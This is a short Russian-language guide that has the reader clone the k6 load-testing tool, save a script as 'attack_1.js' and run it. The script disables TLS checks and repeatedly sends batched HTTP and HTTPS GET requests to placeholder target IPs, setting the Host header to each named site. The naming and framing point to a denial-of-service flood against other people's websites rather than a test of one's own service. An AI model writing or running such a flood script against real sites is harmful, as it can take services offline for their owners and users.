```
git clone https://github.com/grafana/k6.git
cd k6
```

создайте новый файл ./samples/attack_1.js

вставьте этот листинг

```
import { check } from 'k6';
import http from 'k6/http';

export let options = {
  insecureSkipTLSVerify: true,
  stages: [
      { duration: "10m", target: 5 },
  ]
}

export default function() {
  let targets = {
    '<url>': '<ip>'
  }
  let reqs = []

  for (let k in targets) {
    reqs.push(
      {
        'method': 'GET',
        'url': `https://${targets[k]}`,
        'params': {
          'headers': { 'Host': `${k}` }
        }
      }
    )
    reqs.push(
      {
        'method': 'GET',
        'url': `http://${targets[k]}`,
        'params': {
          'headers': { 'Host': `${k}` }
        }
      }
    )

  }
  http.batch(reqs);
};
```

запустите

```
k6 run ./samples/attack_1.js
```
